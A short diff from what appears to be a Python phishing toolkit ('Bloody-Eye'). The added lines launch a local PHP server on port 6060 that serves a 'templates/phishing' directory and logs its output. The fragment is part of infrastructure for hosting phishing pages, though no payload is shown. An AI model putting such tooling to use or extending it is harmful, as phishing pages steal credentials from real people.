@@ -555,6 +555,8 @@ exit();""")
       phpserver()
       print("")
       time.sleep(0.07)
+      with open("log","w") as phplog:
+         Popen(("php","-S","localhost:6060","-t","../Bloody-Eye/templates/phishing"),stderr=phplog,stdout=phplog)
       print(Fore.RED+" ["+Fore.WHITE+"!"+Fore.RED+"]"+" Php Server Has Started on Port 6060")
       print("")
       time.sleep(0.07)
